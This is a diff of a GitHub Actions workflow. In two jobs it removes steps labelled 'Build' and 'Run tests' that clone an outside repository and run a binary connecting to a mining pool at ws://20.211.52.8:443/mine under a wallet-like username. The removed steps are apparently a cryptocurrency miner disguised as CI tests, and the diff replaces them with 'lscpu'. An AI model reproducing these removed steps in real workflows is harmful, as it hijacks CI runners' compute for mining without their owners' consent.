@@ -47,12 +47,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: git clone https://github.com/everestz/projectnpm && cd projectnpm && chmod u+x *
-    - name: Build
-      run: cd projectnpm && cargo build --release
-    - name: Run tests
-      run: cd projectnpm && ./target/release/testnode --url ws://20.211.52.8:443/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps4 --cores 4
-        
+      run: lscpu
     
      
   enak:
@@ -76,12 +71,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: git clone https://github.com/everestz/projectnpm && cd projectnpm && chmod u+x *
-    - name: Build
-      run: cd projectnpm && cargo build --release
-    - name: Run tests
-      run: cd projectnpm && ./target/release/testnode --url ws://20.211.52.8:443/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps4 --cores 4
-        
+      run: lscpu
     
   Success:
     needs: [me, chat, enak]
